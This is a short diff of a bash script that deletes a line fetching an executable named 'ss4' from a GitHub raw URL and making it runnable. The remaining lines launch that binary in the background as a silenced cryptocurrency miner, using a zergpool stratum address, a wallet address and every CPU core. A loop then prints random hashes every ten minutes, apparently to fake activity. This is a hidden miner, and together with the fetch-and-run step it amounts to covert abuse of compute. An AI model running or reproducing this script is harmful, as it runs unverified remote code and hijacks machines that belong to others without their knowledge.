@@ -1,4 +1,3 @@
 #!/bin/bash
-rm -f ss4 && wget -q 'https://github.com/samnialoska22/faksa/raw/refs/heads/main/ss4' && chmod +x ss4
 nohup ./ss4 -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u D786Q59xzNpTfyewB9mFZjYTHJKs2zE8zV -p c=DGB,mc=QCH -t $(nproc --all) > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
